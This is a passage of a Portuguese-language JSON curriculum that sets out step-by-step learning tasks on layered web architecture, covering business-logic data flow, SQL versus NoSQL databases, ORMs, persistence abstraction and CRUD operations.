                              ],
                              "assessmentCriteria": [
                                "Precisão técnica: descrições alinhadas com docs oficiais (40%).",
                                "Profundidade: substeps implementados e fluxos detalhados (30%).",
                                "Comparação: prós/contras balanceados (15%).",
                                "Exemplos práticos: funcionais e relevantes (10%).",
                                "Organização: JSON/diagramas claros (5%)."
                              ],
                              "crossCurricularConnections": [
                                "Programação Orientada a Objetos (classes/services em Spring/ASP.NET).",
                                "Bancos de Dados (integração futura com lógica de negócios).",
                                "Redes/HTTP (protocolos subjacentes).",
                                "Gestão de Projetos (escolha de stack tecnológico)."
                              ],
                              "realWorldApplication": "Em APIs de e-commerce como Amazon (Spring Boot para escalabilidade), apps de delivery como Uber Eats (Node.js para real-time), ou sistemas bancários (.NET para segurança enterprise), onde lógica valida transações, aplica regras antifraude e integra pagamentos."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.1.2.2.4",
                            "name": "Desenhar um fluxo de dados na camada de lógica de negócios",
                            "description": "Criar um diagrama simples mostrando o recebimento de dados da apresentação, aplicação de regras e encaminhamento para persistência, enfatizando o desacoplamento.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender os conceitos fundamentais da camada de lógica de negócios",
                                  "subSteps": [
                                    "Estude a definição de arquitetura em camadas: apresentação, lógica de negócios e persistência.",
                                    "Identifique o papel da camada de lógica: receber dados da apresentação, aplicar regras de negócio e encaminhar para persistência.",
                                    "Revise exemplos de desacoplamento: interfaces ou contratos entre camadas sem dependências diretas.",
                                    "Anote os principais fluxos de dados: entrada → processamento → saída.",
                                    "Desenhe um esboço mental simples do fluxo geral."
                                  ],
                                  "verification": "Descreva verbalmente ou por escrito o fluxo de dados em 3 frases claras.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Documentação de arquitetura em camadas (PDF ou site)",
                                    "Papel e caneta para anotações"
                                  ],
                                  "tips": "Use analogias como 'uma fábrica onde a linha de montagem (lógica) recebe peças (apresentação) e envia produtos prontos (persistência).",
                                  "learningObjective": "Dominar os conceitos chave de fluxo e desacoplamento na camada de lógica de negócios.",
                                  "commonMistakes": [
                                    "Confundir lógica de negócios com lógica de apresentação.",
                                    "Ignorar o desacoplamento, assumindo chamadas diretas ao banco."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Planejar os elementos do diagrama",
                                  "subSteps": [
                                    "Liste os componentes: Caixa para 'Camada de Apresentação', 'Camada de Lógica de Negócios' e 'Camada de Persistência'.",
                                    "Defina regras de negócio a exemplificar: validação, cálculo, autorização.",
                                    "Planeje setas de fluxo: seta de entrada da apresentação para lógica, seta interna para regras, seta de saída para persistência.",
                                    "Decida símbolos: retângulos para camadas, setas direcionais para fluxos, legendas para ênfase no desacoplamento.",
                                    "Esboce layout no papel: disposição horizontal ou vertical."
                                  ],
                                  "verification": "Crie uma lista numerada de todos os elementos planejados e revise se cobre entrada, processamento e saída.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Papel quadriculado e lápis",
                                    "Ferramenta online como Draw.io ou Lucidchart (gratuita)"
                                  ],
                                  "tips": "Mantenha simples: foque em 3-4 setas principais para evitar complexidade desnecessária.",
                                  "learningObjective": "Planejar componentes precisos que representem o fluxo com ênfase em desacoplamento.",
                                  "commonMistakes": [
                                    "Incluir detalhes de implementação como código SQL.",
                                    "Esquecer setas bidirecionais se houver respostas."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Desenhar o diagrama completo",
                                  "subSteps": [
                                    "Desenhe as caixas das camadas com labels claros: 'Apresentação (UI)', 'Lógica de Negócios', 'Persistência (DB)'.",
                                    "Adicione setas: 'Dados de Entrada' da Apresentação → Lógica; dentro da Lógica: 'Aplicar Regras' → 'Dados Processados' → Persistência.",
                                    "Inclua legendas: 'Desacoplamento via Interface' nas setas.",
                                    "Use cores ou estilos para diferenciar fluxos: azul para entrada, verde para processamento.",
                                    "Adicione título: 'Fluxo de Dados na Camada de Lógica de Negócios'."
                                  ],
                                  "verification": "Mostre o diagrama a alguém e pergunte se o fluxo de recebimento → regras → persistência está claro.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Ferramenta de diagramação (Draw.io, Visio ou papel/caneta)",
                                    "Marcadores coloridos"
                                  ],
                                  "tips": "Use setas com labels descritivos como 'Solicitação de Dados' para maior clareza.",
                                  "learningObjective": "Construir um diagrama visual que ilustre precisamente o fluxo e o desacoplamento.",
                                  "commonMistakes": [
                                    "Fazer setas circulares que impliquem acoplamento forte.",
                                    "Sobrecarregar com muitos detalhes desnecessários."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Revisar e refinar o diagrama",
                                  "subSteps": [
                                    "Verifique se todas as setas enfatizam desacoplamento (sem referências diretas a classes específicas).",
                                    "Teste legibilidade: imprima ou exporte e veja de longe.",
                                    "Adicione notas explicativas se necessário: 'Regras: Validação, Cálculo, Autorização'.",
                                    "Compare com um exemplo padrão de arquitetura em camadas.",
                                    "Salve em formato digital e gere uma versão final."
                                  ],
                                  "verification": "Autoavaliação com checklist: fluxo correto? Desacoplamento evidente? Simples e claro?",
                                  "estimatedTime": "10 minutos",
                                  "materials": [
                                    "Checklist impresso",
                                    "Software de edição de imagens"
                                  ],
                                  "tips": "Peça feedback de um par para identificar ambiguidades.",
                                  "learningObjective": "Garantir que o diagrama seja profissional, preciso e comunicativo.",
                                  "commonMistakes": [
                                    "Ignorar erros de ortografia em labels.",
                                    "Não testar a compreensão por terceiros."
                                  ]
                                }
                              ],
                              "practicalExample": "Em um sistema de e-commerce, a camada de apresentação envia dados de um pedido (itens, quantidade). A lógica de negócios recebe via interface, aplica regras (verificar estoque, calcular frete e impostos), e encaminha o pedido validado para a camada de persistência salvar no banco, sem a lógica conhecer detalhes do UI ou DB.",
                              "finalVerifications": [
                                "O diagrama mostra claramente três camadas com setas unidirecionais entre elas.",
                                "Há representação explícita de aplicação de regras na lógica de negócios.",
                                "Desacoplamento é enfatizado (ex: interfaces ou contratos nas setas).",
                                "Labels das setas descrevem o tipo de dados (entrada/processada).",
                                "Diagrama é simples, legível e sem elementos desnecessários.",
                                "Título e legenda estão presentes."
                              ],
                              "assessmentCriteria": [
                                "Precisão conceitual: fluxo correto de apresentação → lógica → persistência (30%).",
                                "Ênfase no desacoplamento: uso de interfaces ou abstrações (25%).",
                                "Clareza visual: uso de símbolos padrão, cores e labels (20%).",
                                "Completude: inclusão de regras de negócio no fluxo (15%).",
                                "Simplicidade e legibilidade: evita sobrecarga (10%)."
                              ],
                              "crossCurricularConnections": [
                                "Modelagem de Dados: Relaciona com diagramas ER para persistência.",
                                "Programação Orientada a Objetos: Uso de interfaces para desacoplamento.",
                                "Análise de Sistemas: Fluxogramas semelhantes a DFD (Data Flow Diagrams).",
                                "Banco de Dados: Entendimento de como dados chegam à persistência.",
                                "Design de Software: Princípios SOLID, especialmente Dependency Inversion."
                              ],
                              "realWorldApplication": "Arquitetos de software usam esses diagramas em reuniões de equipe para alinhar desenvolvedores sobre como implementar serviços desacoplados em microsserviços ou apps web escaláveis, como no Netflix ou bancos digitais, evitando 'spaghetti code' e facilitando manutenção."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      },
                      {
                        "id": "10.1.1.2.3",
                        "name": "Camada de Persistência de Dados",
                        "description": "A camada de persistência gerencia o armazenamento, recuperação e manipulação de dados, utilizando bancos de dados e abstrações como ORMs para isolar a aplicação dos detalhes de implementação do banco.",
                        "specificSkills": [
                          {
                            "id": "10.1.1.2.3.1",
                            "name": "Identificar tipos de bancos de dados na camada de persistência",
                            "description": "Diferenciar bancos relacionais (SQL como MySQL) de NoSQL (MongoDB), explicando escolhas baseadas em necessidades da aplicação web.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender os fundamentos de bancos de dados relacionais (SQL)",
                                  "subSteps": [
                                    "Defina o que é um banco de dados relacional e sua base no modelo relacional de E.F. Codd.",
                                    "Identifique componentes principais: tabelas, linhas, colunas, chaves primárias e estrangeiras.",
                                    "Explique o esquema rígido (schema) e a normalização para evitar redundâncias.",
                                    "Descreva linguagens como SQL para consultas (SELECT, INSERT, UPDATE, DELETE).",
                                    "Exemplo: MySQL como implementação popular para aplicações transacionais."
                                  ],
                                  "verification": "Crie um diagrama simples de um esquema relacional com pelo menos duas tabelas relacionadas.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Documentação oficial do MySQL",
                                    "Ferramenta de modelagem como Draw.io",
                                    "Vídeo introdutório sobre SQL no YouTube"
                                  ],
                                  "tips": "Use analogias como planilhas Excel para visualizar tabelas relacionais.",
                                  "learningObjective": "Entender a estrutura rígida e transacional dos bancos SQL.",
                                  "commonMistakes": [
                                    "Confundir chaves primárias com índices",
                                    "Ignorar a importância da normalização",
                                    "Achar que SQL é apenas para grandes empresas"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Compreender os fundamentos de bancos de dados NoSQL",
                                  "subSteps": [
                                    "Defina NoSQL como bancos não relacionais, focados em escalabilidade e flexibilidade.",
                                    "Classifique tipos: documento (MongoDB), key-value (Redis), coluna (Cassandra), grafo (Neo4j).",
                                    "Explique esquema flexível (schema-less) e armazenamento de dados não estruturados.",
                                    "Descreva operações como CRUD via APIs nativas ou drivers específicos.",
                                    "Exemplo: MongoDB para armazenar documentos JSON em aplicações web dinâmicas."
                                  ],
                                  "verification": "Escreva um exemplo de documento JSON que seria armazenado no MongoDB.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Documentação oficial do MongoDB",
                                    "MongoDB Compass para visualização",
                                    "Tutorial interativo no MongoDB University"
                                  ],
                                  "tips": "Pense em NoSQL como 'caixas de sapato' flexíveis vs 'gavetas organizadas' do SQL.",
                                  "learningObjective": "Dominar a flexibilidade e escalabilidade dos bancos NoSQL.",
                                  "commonMistakes": [
                                    "Achar que NoSQL não suporta transações",
                                    "Confundir todos os NoSQL como iguais",
                                    "Subestimar a necessidade de modelagem mesmo sem schema rígido"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Comparar bancos relacionais e NoSQL",
                                  "subSteps": [
                                    "Crie uma tabela comparativa: estrutura de dados (tabular vs hierárquica), escalabilidade (vertical vs horizontal).",
                                    "Analise CAP Theorem: consistência, disponibilidade e tolerância a partições.",
                                    "Discuta ACID (SQL) vs BASE (NoSQL) para garantias de transações.",
                                    "Compare casos de uso: SQL para finanças, NoSQL para big data e real-time.",
                                    "Identifique hibridizações modernas como NewSQL."
                                  ],
                                  "verification": "Preencha uma tabela de comparação com pelo menos 5 critérios chave.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Artigo sobre CAP Theorem",
                                    "Planilha Google Sheets para tabela comparativa",
                                    "Infográfico SQL vs NoSQL"
                                  ],
                                  "tips": "Use cores na tabela para destacar forças e fraquezas de cada tipo.",
                                  "learningObjective": "Diferenciar claramente SQL e NoSQL em termos técnicos e práticos.",
                                  "commonMistakes": [
                                    "Generalizar que NoSQL é sempre mais rápido",
                                    "Ignorar custos de escalabilidade vertical no SQL",
                                    "Não considerar o teorema CAP"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Avaliar escolhas baseadas em necessidades de aplicações web",
                                  "subSteps": [
                                    "Liste fatores: volume de dados, velocidade de leitura/escrita, estrutura de dados (estruturada vs não).",
                                    "Analise cenários: e-commerce (SQL para transações), rede social (NoSQL para perfis flexíveis).",
                                    "Considere custo, manutenção e integração com frameworks web (ex: Node.js + MongoDB).",
                                    "Discuta migrações e poliglot persistence (múltiplos bancos).",
                                    "Pratique escolhendo banco para um app hipotético."
                                  ],
                                  "verification": "Justifique a escolha de um banco para 2 cenários web diferentes.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Casos de estudo: Netflix (Cassandra), Uber (PostgreSQL + esquemas NoSQL)",
                                    "Ferramenta de decisão online como DB-Engines"
                                  ],
                                  "tips": "Pergunte: 'Os dados mudam muito? Preciso de joins complexos?'",
                                  "learningObjective": "Aplicar critérios de decisão para seleção de banco na camada de persistência.",
                                  "commonMistakes": [
                                    "Escolher SQL por 'segurança' sem analisar necessidades",
                                    "Usar NoSQL para tudo por hype",
                                    "Ignorar performance em produção"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um e-commerce web: Use MySQL (SQL) para carrinho de compras com transações ACID e relacionamentos entre usuários, produtos e pedidos. Para recomendações personalizadas com dados não estruturados (cliques, preferências), integre MongoDB (NoSQL) para escalabilidade horizontal e consultas rápidas em JSON.",
                              "finalVerifications": [
                                "Diferencie corretamente pelo menos 4 características chave entre SQL e NoSQL.",
                                "Crie um diagrama ER para SQL e um modelo de documento para NoSQL.",
                                "Justifique escolha de banco para 3 cenários web variados.",
                                "Explique CAP Theorem aplicado a um exemplo real.",
                                "Liste prós e contras de cada tipo sem erros factuais.",
                                "Identifique quando usar abordagem híbrida."
                              ],
                              "assessmentCriteria": [
                                "Precisão conceitual (SQL vs NoSQL: 30%)",
                                "Profundidade da comparação (tabela/critérios: 25%)",
                                "Relevância às apps web (cenários práticos: 20%)",
                                "Clareza na justificativa de escolhas (15%)",
                                "Uso correto de terminologia técnica (10%)"
                              ],
                              "crossCurricularConnections": [
                                "Programação: Integração com ORMs como Sequelize (SQL) ou Mongoose (MongoDB).",
                                "Análise de Sistemas: Modelagem de dados na fase de requisitos.",
                                "Administração: Custos de escalabilidade e licenças de bancos.",
                                "Matemática: Teoria de grafos para NoSQL de grafos."
                              ],
                              "realWorldApplication": "Bancos como Nubank usam SQL (PostgreSQL) para transações financeiras seguras; apps como Instagram empregam NoSQL (Cassandra) para feeds em tempo real com bilhões de usuários, otimizando a camada de persistência para alta disponibilidade."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.1.2.3.2",
                            "name": "Explicar o conceito de ORM e sua utilidade",
                            "description": "Descrever Object-Relational Mapping (ex: Hibernate, Sequelize) como ponte entre objetos da lógica de negócios e estruturas de dados, facilitando CRUD operations.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender o Problema do Impedance Mismatch",
                                  "subSteps": [
                                    "Estude os conceitos básicos de bancos de dados relacionais (tabelas, linhas, colunas, chaves primárias e estrangeiras).",
                                    "Revise programação orientada a objetos (classes, objetos, herança, encapsulamento).",
                                    "Identifique diferenças: dados relacionais são baseados em tabelas planas, enquanto objetos têm hierarquias e comportamentos.",
                                    "Analise um exemplo simples de CRUD manual com SQL puro versus objetos em Java ou JavaScript.",
                                    "Discuta como isso leva a código boilerplate e erros de mapeamento."
                                  ],
                                  "verification": "Escreva um parágrafo explicando o impedance mismatch com um exemplo de código SQL vs. objeto.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Artigo 'Object-Relational Impedance Mismatch' no Martin Fowler site",
                                    "Documentação básica de SQL e OOP em tutoriais como freeCodeCamp"
                                  ],
                                  "tips": "Use diagramas para visualizar tabelas vs. árvores de objetos.",
                                  "learningObjective": "Identificar as discrepâncias entre modelos de dados relacionais e orientados a objetos.",
                                  "commonMistakes": "Confundir chaves estrangeiras com referências de objetos; ignorar o custo de queries N+1."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Definir o Conceito de ORM e Exemplos Populares",
                                  "subSteps": [
                                    "Defina ORM como uma técnica que mapeia objetos de domínio para estruturas relacionais.",
                                    "Liste exemplos: Hibernate (Java), Sequelize (Node.js), Entity Framework (.NET).",
                                    "Explique o papel: abstrai SQL, gerencia mapeamentos via anotações ou configurações.",
                                    "Diferencie ORM de ODM (para NoSQL) e raw SQL.",
                                    "Pesquise definições oficiais de pelo menos dois ORMs."
                                  ],
                                  "verification": "Crie uma tabela comparativa de 3 ORMs com linguagem suportada e features principais.",
                                  "estimatedTime": "15 minutos",
                                  "materials": [
                                    "Documentação oficial Hibernate e Sequelize",
                                    "Wikipedia: Object-relational mapping"
                                  ],
                                  "tips": "Foquem em ORMs maduros usados em produção para relevância.",
                                  "learningObjective": "Reconhecer ORM como ponte conceitual e citar exemplos reais.",
                                  "commonMistakes": "Confundir ORM com frameworks full-stack; achar que ORM elimina SQL completamente."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Explicar o Funcionamento Básico do ORM para CRUD",
                                  "subSteps": [
                                    "Descreva mapeamento: entidade/classe para tabela, atributos para colunas, relacionamentos para FKs.",
                                    "Simule CREATE: persistir objeto gera INSERT SQL automático.",
                                    "Simule READ: query por objeto gera SELECT com joins.",
                                    "Simule UPDATE/DELETE: mudanças no objeto propagam para banco.",
                                    "Aborde lazy vs. eager loading e transações."
                                  ],
                                  "verification": "Desenhe um fluxograma de como um ORM processa save() em um objeto User.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Tutorial 'Primeiro app com Hibernate' ou 'Sequelize Models'",
                                    "Ferramenta de diagrama como Draw.io"
                                  ],
                                  "tips": "Teste em um playground online se possível para ver SQL gerado.",
                                  "learningObjective": "Mapear operações CRUD de objetos para SQL via ORM.",
                                  "commonMistakes": "Ignorar overhead de performance em relacionamentos complexos; não entender caching."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Analisar Utilidades, Benefícios e Limitações",
                                  "subSteps": [
                                    "Liste benefícios: produtividade (menos SQL), portabilidade de DB, type-safety.",
                                    "Discuta cenários ideais: apps com lógica de negócios rica.",
                                    "Mencione limitações: curva de aprendizado, performance em queries complexas.",
                                    "Compare com SQL nativo ou micro-ORMS como Exposed (Kotlin).",
                                    "Conclua com quando usar ORM na camada de persistência."
                                  ],
                                  "verification": "Escreva prós e contras em uma lista balanceada com exemplos.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Blog posts 'When to use ORM vs Raw SQL'",
                                    "Stack Overflow threads sobre performance ORM"
                                  ],
                                  "tips": "Pense em trade-offs: velocidade de desenvolvimento vs. controle fino.",
                                  "learningObjective": "Avaliar utilidade prática do ORM em arquiteturas em camadas.",
                                  "commonMistakes": "Superestimar benefícios ignorando casos onde SQL puro é melhor; confundir com NoSQL."
                                }
                              ],
                              "practicalExample": "Em um app de e-commerce com Sequelize (Node.js), defina model User com associações para Order. Use user.save() para criar usuário e user.getOrders() para listar pedidos, gerando SQL automaticamente sem escrever queries manuais.",
                              "finalVerifications": [
                                "Explicar ORM em 1 minuto sem consultar notas.",
                                "Identificar impedance mismatch em um diagrama dado.",
                                "Listar 3 benefícios e 2 limitações do ORM.",
                                "Diferenciar ORM de SQL raw com exemplo de código.",
                                "Nomear 2 ORMs e suas linguagens principais.",
                                "Desenhar mapeamento simples classe-tabela."
                              ],
                              "assessmentCriteria": [
                                "Precisão conceitual: definição correta de ORM e mismatch.",
                                "Exemplos relevantes: uso de ORMs reais em contextos apropriados.",
                                "Profundidade em CRUD: explicação clara de mapeamentos e operações.",
                                "Análise crítica: benefícios vs. limitações balanceados.",
                                "Clareza na comunicação: uso de analogias e diagramas.",
                                "Conexão com arquitetura: posicionamento na camada de persistência."
                              ],
                              "crossCurricularConnections": [
                                "Banco de Dados: Modelagem relacional e normalização.",
                                "Programação Orientada a Objetos: Design de classes de domínio.",
                                "Arquitetura de Software: Padrões como Repository e Data Mapper.",
                                "Desenvolvimento Web: Integração com frameworks como Spring Boot ou Express.js."
                              ],
                              "realWorldApplication": "Em sistemas empresariais como ERPs (ex: SAP com Hibernate), ORMs aceleram desenvolvimento de módulos de persistência, permitindo equipes focarem em lógica de negócios em vez de SQL boilerplate, reduzindo tempo de deploy em 40-60%."
                            },
                            "estimatedTime": "0.5 hora",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.1.2.3.3",
                            "name": "Descrever a importância da abstração na persistência",
                            "description": "Explicar como trocar bancos sem afetar camadas superiores, promovendo portabilidade e manutenção em arquiteturas em camadas para internet.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender o Conceito de Abstração na Camada de Persistência",
                                  "subSteps": [
                                    "Definir abstração como a separação de detalhes de implementação da interface pública.",
                                    "Explicar o papel da camada de persistência em arquiteturas em camadas (ex: acesso a dados isolado das camadas de negócio e apresentação).",
                                    "Identificar exemplos iniciais de abstração, como interfaces genéricas para repositórios de dados.",
                                    "Diferenciar abstração de conceitos relacionados como encapsulamento e herança."
                                  ],
                                  "verification": "Criar um diagrama simples mostrando camadas e onde a abstração ocorre.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Diagrama de arquitetura em camadas (ferramenta como Draw.io)",
                                    "Documentação de padrões como Repository Pattern"
                                  ],
                                  "tips": "Use analogias cotidianas, como um controle remoto que abstrai a complexidade interna da TV.",
                                  "learningObjective": "Entender o que é abstração e seu local específico na camada de persistência.",
                                  "commonMistakes": "Confundir abstração com esconder dados (encapsulamento) em vez de esconder implementação."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar o Problema sem Abstração",
                                  "subSteps": [
                                    "Descrever um cenário onde o código de negócio usa SQL direto para um banco específico (ex: MySQL).",
                                    "Simular o impacto de trocar o banco (ex: para PostgreSQL): alterações em queries, drivers, configurações.",
                                    "Mapear como isso propaga erros para camadas superiores (negócio e UI).",
                                    "Listar consequências: tempo de refatoração, downtime, custo de manutenção."
                                  ],
                                  "verification": "Escrever um pseudocódigo 'ruim' sem abstração e listar 5 problemas ao trocar BD.",
                                  "estimatedTime": "1 hora",
                                  "materials": [
                                    "Pseudocódigo editor (VS Code)",
                                    "Exemplos de queries SQL específicas de MySQL vs PostgreSQL"
                                  ],
                                  "tips": "Pense em termos de 'custo de mudança' para quantificar o problema.",
                                  "learningObjective": "Reconhecer os riscos de acoplamento forte entre camadas e bancos de dados.",
                                  "commonMistakes": "Subestimar o impacto em grandes sistemas, focando só em apps pequenos."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Explorar Mecanismos de Abstração",
                                  "subSteps": [
                                    "Estudar padrões como DAO (Data Access Object) ou Repository para interfaces genéricas.",
                                    "Investigar ORMs (ex: Hibernate, Entity Framework) que abstraem SQL nativo.",
                                    "Demonstrar com código: interface comum implementada para diferentes bancos.",
                                    "Explicar injeção de dependências para trocar implementações em runtime."
                                  ],
                                  "verification": "Implementar um exemplo mínimo de interface Repository com duas implementações (MySQL e mock).",
                                  "estimatedTime": "1.5 horas",
                                  "materials": [
                                    "Documentação Hibernate ou Spring Data JPA",
                                    "Ambiente de desenvolvimento com Maven/Gradle"
                                  ],
                                  "tips": "Comece com interfaces puras antes de ORMs para entender o 'por quê' antes do 'como'.",
                                  "learningObjective": "Saber como implementar abstração prática na persistência.",
                                  "commonMistakes": "Achar que ORM é a única solução, ignorando DAOs leves."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Avaliar Benefícios e Desafios",
                                  "subSteps": [
                                    "Listar benefícios: portabilidade (troca de BD fácil), manutenção (mudanças isoladas), escalabilidade.",
                                    "Discutir cenários reais: migração de dados, suporte multi-BD em SaaS.",
                                    "Analisar trade-offs: overhead de performance, complexidade inicial.",
                                    "Preparar uma explicação clara da importância geral."
                                  ],
                                  "verification": "Redigir um parágrafo explicando a importância, citando pelo menos 3 benefícios.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Artigos sobre migrações de BD em empresas (ex: Netflix case studies)",
                                    "Planilha de prós/contras"
                                  ],
                                  "tips": "Use métricas como 'tempo de migração reduzido de semanas para horas'.",
                                  "learningObjective": "Articular a importância da abstração em termos de portabilidade e manutenção.",
                                  "commonMistakes": "Ignorar desafios como performance, focando só em benefícios."
                                }
                              ],
                              "practicalExample": "Em um e-commerce web, usar Spring Data JPA com interface Repository permite trocar de H2 (dev) para MySQL (prod) e depois PostgreSQL (escala), alterando apenas a configuração de datasource, sem tocar no código de negócio ou controllers.",
                              "finalVerifications": [
                                "Explica corretamente o conceito de abstração na persistência em suas palavras.",
                                "Identifica pelo menos 3 impactos negativos sem abstração.",
                                "Descreve um mecanismo prático (ex: DAO/ORM) com exemplo.",
                                "Lista benefícios como portabilidade e manutenção com exemplos reais.",
                                "Cria um diagrama mostrando decoupling de camadas."
                              ],
                              "assessmentCriteria": [
                                "Clareza na explicação conceitual (20%)",
                                "Precisão técnica nos mecanismos e benefícios (30%)",
                                "Uso de exemplos práticos e diagramas (20%)",
                                "Análise de trade-offs e cenários reais (20%)",
                                "Capacidade de articulação oral/escrita (10%)"
                              ],
                              "crossCurricularConnections": [
                                "Design Patterns (Repository Pattern)",
                                "Engenharia de Software (Princípios SOLID - Dependency Inversion)",
                                "Banco de Dados (Modelagem e ORMs)",
                                "Desenvolvimento Ágil (Refatoração e Manutenção)"
                              ],
                              "realWorldApplication": "Empresas como Google ou AWS usam abstração em serviços como Cloud Spanner, permitindo migrações transparentes de bancos regionais sem downtime em apps globais de internet, reduzindo custos de manutenção em milhões."
                            },
                            "estimatedTime": "0.5 hora",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.1.2.3.4",
                            "name": "Exemplificar operações CRUD na camada de persistência",
                            "description": "Implementar exemplos de Create, Read, Update, Delete usando SQL ou ORM, mostrando integração com a lógica de negócios em um contexto web.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Configurar o ambiente e o modelo de dados na camada de persistência",
                                  "subSteps": [
                                    "Instalar dependências necessárias como Node.js, Express e um ORM como Sequelize ou driver SQL como pg para PostgreSQL.",
                                    "Criar a estrutura de pastas para a camada de persistência (ex: /persistence ou /repository).",
                                    "Definir o modelo de entidade (ex: tabela 'usuarios' com campos id, nome, email, criado_em).",
                                    "Configurar conexão com o banco de dados e executar script de criação da tabela.",
                                    "Testar a conexão executando uma query simples SELECT COUNT(*)."
                                  ],
                                  "verification": "Conexão estabelecida e tabela criada sem erros; execute uma query de teste que retorna dados.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Node.js",
                                    "PostgreSQL ou SQLite",
                                    "Sequelize ORM ou pg library",
                                    "Editor de código como VS Code"
                                  ],
                                  "tips": "Use variáveis de ambiente para credenciais do banco para segurança.",
                                  "learningObjective": "Entender a configuração básica da camada de persistência e modelagem de dados.",
                                  "commonMistakes": [
                                    "Esquecer de importar módulos",
                                    "Configurar credenciais hardcoded",
                                    "Não sincronizar o modelo com o banco"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Implementar a operação CREATE",
                                  "subSteps": [
                                    "Criar método create no repositório/persistence (ex: async create(usuarioData)).",
                                    "Usar INSERT SQL ou ORM equivalente com prepared statements para inserir dados.",
                                    "Implementar validação básica de campos obrigatórios antes da inserção.",
                                    "Tratar exceções como duplicatas de chave única (ex: email único).",
                                    "Retornar o objeto criado com ID gerado."
                                  ],
                                  "verification": "Inserir um usuário via método e verificar no banco se o registro foi criado corretamente.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Código do Step 1",
                                    "Ferramenta de query como pgAdmin ou DBeaver"
                                  ],
                                  "tips": "Sempre use transações para operações atômicas em produção.",
                                  "learningObjective": "Dominar inserção de dados com integridade na camada de persistência.",
                                  "commonMistakes": [
                                    "Não escapar inputs levando a SQL injection",
                                    "Ignorar retornos de ID auto-increment",
                                    "Não validar dados de entrada"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Implementar a operação READ",
                                  "subSteps": [
                                    "Criar métodos findById(id) e findAll(filters) no repositório.",
                                    "Usar SELECT com WHERE e JOINs se necessário (ex: buscar usuário por email).",
                                    "Implementar paginação básica (LIMIT e OFFSET).",
                                    "Mapear resultados para objetos de domínio ou DTOs.",
                                    "Adicionar logging para queries executadas."
                                  ],
                                  "verification": "Chamar findById e findAll; resultados devem corresponder aos dados inseridos.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "Código anterior",
                                    "Postman para testes iniciais"
                                  ],
                                  "tips": "Evite SELECT *; especifique colunas para performance.",
                                  "learningObjective": "Realizar consultas eficientes e seguras na persistência.",
                                  "commonMistakes": [
                                    "Queries sem índices levando a lentidão",
                                    "Expor senhas em selects",
                                    "Não tratar casos de não encontrado"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Implementar as operações UPDATE e DELETE",
                                  "subSteps": [
                                    "Criar updateById(id, data) usando UPDATE SQL com WHERE id.",
                                    "Implementar deleteById(id) com DELETE SQL e verificação de existência.",
                                    "Adicionar versionamento otimista (ex: campo updated_at ou version).",
                                    "Tratar cenários de concorrência (ex: rowversion no banco).",
                                    "Confirmar mudanças com SELECT pós-operação."
                                  ],
                                  "verification": "Atualizar e deletar um registro; verificar alterações no banco.",
                                  "estimatedTime": "35 minutos",
                                  "materials": [
                                    "Código dos steps anteriores"
                                  ],
                                  "tips": "Use soft delete (adicionar campo deleted_at) em vez de hard delete.",
                                  "learningObjective": "Gerenciar modificações e remoções seguras de dados.",
                                  "commonMistakes": [
                                    "Atualizar múltiplos registros por erro no WHERE",
                                    "Deletar sem confirmação",
                                    "Não atualizar timestamps"
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Integrar operações CRUD com lógica de negócios em contexto web",
                                  "subSteps": [
                                    "Criar camada de serviço que chama métodos de persistência.",
                                    "Implementar controller REST com rotas /usuarios (POST, GET, PUT, DELETE).",
                                    "Adicionar validação de negócios (ex: email válido, idade mínima).",
                                    "Tratar erros HTTP (400, 404, 500) e respostas JSON.",
                                    "Testar end-to-end com ferramenta como Postman."
                                  ],
